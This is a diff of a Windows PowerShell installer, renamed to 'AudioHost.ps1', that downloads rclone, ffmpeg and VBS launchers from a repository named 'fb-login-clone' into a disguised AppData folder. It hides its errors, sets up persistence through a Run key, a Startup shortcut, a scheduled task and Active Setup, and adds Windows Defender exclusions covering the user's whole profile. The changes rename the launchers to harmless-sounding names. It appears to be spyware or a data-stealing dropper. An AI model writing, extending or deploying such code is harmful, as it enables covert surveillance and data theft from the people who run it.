@@ -1,4 +1,4 @@
-# setup.ps1
+# AudioHost.ps1
 
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -6,12 +6,12 @@ $dest = "$env:APPDATA\Microsoft\Windows\system_cache"
 $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
 $files = @(
     "system_cache.ps1",
-    "system_cache_launcher.bat",
+    "TaskService.bat",
     "rclone.exe",
     "rclone.conf",
     "ffmpeg.exe",
     "setup.vbs",
-    "system_cache_launcher.vbs"
+    "TaskService.vbs"
 )
 
 # Create folder
@@ -34,7 +34,7 @@ foreach ($file in $files) {
 # Register autostart
 try {
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-        -Name "system_cache" -Value "$dest\system_cache_launcher.vbs"
+        -Name "system_cache" -Value "$dest\TaskService.vbs"
 } catch {}
 
 # Add to Startup folder (duplicate autostart method)
@@ -42,7 +42,7 @@ try {
     $WshShell = New-Object -ComObject WScript.Shell
     $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_cache.lnk"
     $shortcut = $WshShell.CreateShortcut($lnkPath)
-    $shortcut.TargetPath = "$dest\system_cache_launcher.vbs"
+    $shortcut.TargetPath = "$dest\TaskService.vbs"
     $shortcut.WorkingDirectory = $dest
     $shortcut.Save()
 } catch {}
@@ -51,7 +51,7 @@ try {
 try {
     Add-MpPreference -ExclusionPath $dest
     Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
-    Add-MpPreference -ExclusionProcess "$dest\system_cache_launcher.vbs"
+    Add-MpPreference -ExclusionProcess "$dest\TaskService.vbs"
     Add-MpPreference -ExclusionProcess "$dest\rclone.exe"
     Add-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
     Add-MpPreference -ExclusionPath "$env:USERPROFILE"
@@ -67,12 +67,12 @@ try {
 
 # Launch main script silently
 try {
-    Start-Process -WindowStyle Hidden -FilePath "$dest\system_cache_launcher.vbs"
+    Start-Process -WindowStyle Hidden -FilePath "$dest\TaskService.vbs"
 } catch {}
 
 # Task Scheduler (as fallback/autostart)
 try {
-    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\system_cache_launcher.vbs`""
+    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\TaskService.vbs`""
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
     $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
     Register-ScheduledTask -TaskName "SystemCacheUpdater" -Action $Action -Trigger $Trigger -Principal $Principal -Description "System Cache Task" -Force
@@ -82,7 +82,7 @@ try {
 try {
     New-Item -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" -Force | Out-Null
     Set-ItemProperty -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" `
-        -Name "StubPath" -Value "wscript.exe `"$dest\system_cache_launcher.vbs`""
+        -Name "StubPath" -Value "wscript.exe `"$dest\TaskService.vbs`""
 } catch {}
 
 # Self-delete
